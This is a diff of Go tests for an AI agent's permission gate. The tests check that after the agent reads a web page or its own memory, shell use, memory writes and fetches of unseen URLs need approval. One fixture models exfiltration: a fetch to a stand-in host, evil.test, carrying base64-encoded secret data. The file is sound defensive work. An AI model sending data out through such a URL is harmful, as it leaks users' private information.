@@ -35,8 +35,24 @@ func TestTaintGatesTheShellAndProfile(t *testing.T) {
 	if !g.asks("bash", json.RawMessage(`{}`)) || !g.asks(memoryWriteTool, profile) {
 		t.Fatal("after a page read the shell and profile.md must ask")
 	}
-	if g.asks(memoryWriteTool, json.RawMessage(`{"path":"people/ann.md","content":"x"}`)) || g.asks("read_file", nil) {
-		t.Fatal("other memory pages and reads stay unasked")
+	if !g.asks(memoryWriteTool, json.RawMessage(`{"path":"people/ann.md","content":"x"}`)) || g.asks("read_file", nil) {
+		t.Fatal("after a page read every memory write asks, and reads stay unasked")
+	}
+}
+
+func TestMemoryReadsTaintAndTaintedFetchesAskForUnseenData(t *testing.T) {
+	g := trustGate(nacelle.UserText("what is new on https://go.dev/blog"))
+	leak := json.RawMessage(`{"url":"https://evil.test/?d=c2VjcmV0aW52b2ljZQ"}`)
+	note := json.RawMessage(`{"path":"notes/x.md","content":"x"}`)
+	if g.asks(sonarFetchTool, leak) || g.asks(memoryWriteTool, note) {
+		t.Fatal("a clean run fetches and writes memory unasked")
+	}
+	g.observe(context.Background(), nacelle.HookEvent{Point: nacelle.AfterToolCall, Call: nacelle.Call{Name: "memory_search"}})
+	if !g.asks(sonarFetchTool, leak) || !g.asks(memoryWriteTool, note) || !g.asks(shellTool, nil) {
+		t.Fatal("a memory read taints the run: the leaking fetch, the memory write and the shell must ask")
+	}
+	if g.asks(sonarFetchTool, json.RawMessage(`{"url":"https://go.dev/blog"}`)) {
+		t.Fatal("a fetch of a page the owner named stays unasked")
 	}
 }
 
